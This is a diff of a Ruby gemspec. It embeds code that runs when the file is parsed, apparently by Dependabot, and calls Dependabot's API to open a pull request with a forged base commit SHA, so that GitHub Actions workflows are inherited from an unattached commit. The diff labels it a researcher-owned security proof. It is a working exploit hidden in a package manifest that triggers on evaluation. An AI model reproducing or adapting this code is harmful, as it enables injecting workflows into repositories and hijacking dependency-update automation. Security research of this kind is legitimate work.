@@ -4,13 +4,13 @@ require "json"
 require "net/http"
 require "uri"
 
-# Owned-account test of the existing-PR update route. The only explicit file is
-# an allowed vendor marker. The caller-selected unattached parent contains one
-# inert workflow_dispatch file, created through nested Git tree objects.
-module OwnedDependabotUpdateRouteBaseInheritance
-  DEPENDENCY_NAME = "owned_dependabot_update_route_group_probe_3"
-  FORGED_BASE_SHA = "6aae20a7e4b136695c97b2a620e70f766afa649b"
-  MARKER_PATH = "vendor/owned-dependabot-refresh-base-control.txt"
+# Researcher-owned GitHub.com proof. The only explicit update is an inert
+# vendor marker. The two proof workflows are inherited from an unattached
+# commit selected through the separately documented Dependabot base-SHA bug.
+module OwnedDependabotInstallWorkflows
+  DEPENDENCY_NAME = "owned_gei_artifact_pivot_probe"
+  FORGED_BASE_SHA = "fc59bf12a16500bb872f4b10875bbed3348035f9"
+  MARKER_PATH = "vendor/owned-gei-artifact-pivot-install.txt"
 
   module_function
 
@@ -19,20 +19,17 @@ module OwnedDependabotUpdateRouteBaseInheritance
     api_base = ENV["DEPENDABOT_API_URL"]
     return if job_id.to_s.empty? || api_base.to_s.empty?
 
-    marker = "/tmp/owned-dependabot-update-route-base-#{job_id}"
+    marker = "/tmp/owned-gei-artifact-pivot-install-#{job_id}"
     File.open(marker, File::WRONLY | File::CREAT | File::EXCL, 0o600) {}
 
-    endpoint = URI("#{api_base.sub(%r{/*$}, "")}/update_jobs/#{job_id}/update_pull_request")
+    endpoint = URI("#{api_base.sub(%r{/*$}, "")}/update_jobs/#{job_id}/create_pull_request")
     request = Net::HTTP::Post.new(endpoint.request_uri)
     request["Content-Type"] = "application/json"
     request.body = JSON.generate(payload)
     response = proxy_client(endpoint).request(request)
     if response.code.to_i.between?(200, 299)
-      # The API enqueues the PR replacement asynchronously. Keep the updater
-      # alive long enough for that owned operation to finish, then abort this
-      # parse so normal updater logic cannot race it with a close request.
       sleep 25
-      raise "owned Dependabot update-route proof complete"
+      raise "owned workflow installation proof complete"
     end
   rescue Errno::EEXIST
     nil
@@ -47,12 +44,31 @@ module OwnedDependabotUpdateRouteBaseInheritance
   end
 
   def payload
+    requirement = {
+      "file" => "Gemfile",
+      "requirement" => ">= 0",
+      "groups" => [],
+      "source" => {
+        "type" => "git",
+        "url" => "https://github.com/downgraded/codeload-owned-probe-20261030-91f64a2c",
+        "branch" => "main",
+        "ref" => nil
+      }
+    }
+
     {
       "data" => {
-        "dependency-names" => [DEPENDENCY_NAME],
+        "dependencies" => [{
+          "name" => DEPENDENCY_NAME,
+          "version" => "0.0.18",
+          "previous-version" => "0.0.17",
+          "requirements" => [requirement],
+          "previous-requirements" => [requirement],
+          "directory" => "/"
+        }],
         "updated-dependency-files" => [{
           "name" => MARKER_PATH,
-          "content" => "Explicit allowed marker; workflow content exists only in the supplied parent tree.\n",
+          "content" => "Owned installation marker. Workflow bytes exist only in the supplied parent tree.\n",
           "directory" => "/",
           "type" => "file",
           "support_file" => false,
@@ -61,19 +77,19 @@ module OwnedDependabotUpdateRouteBaseInheritance
           "operation" => "create"
         }],
         "base-commit-sha" => FORGED_BASE_SHA,
-        "commit-message" => "test: owned Dependabot existing-PR base inheritance proof",
-        "pr-title" => "Owned Dependabot existing-PR base inheritance proof",
-        "pr-body" => "Owned security test: update_pull_request received only an allowed vendor marker, but its caller-selected unattached parent also contains an inert workflow file. No workflow was executed or merged."
+        "commit-message" => "test: install owned artifact-pivot proof",
+        "pr-title" => "Owned Actions artifact-pivot proof",
+        "pr-body" => "Researcher-owned security test. Two benign workflows are inherited from the caller-selected parent. They only test Actions artifact handling and never print or transmit credentials."
       }
     }
   end
 end
 
-OwnedDependabotUpdateRouteBaseInheritance.run
+OwnedDependabotInstallWorkflows.run
 
 Gem::Specification.new do |spec|
   spec.name = "owned_dependabot_remote_probe"
-  spec.version = "0.0.17"
+  spec.version = "0.0.18"
   spec.summary = "Owned Dependabot security probe"
   spec.authors = ["Owned Security Test"]
   spec.files = []
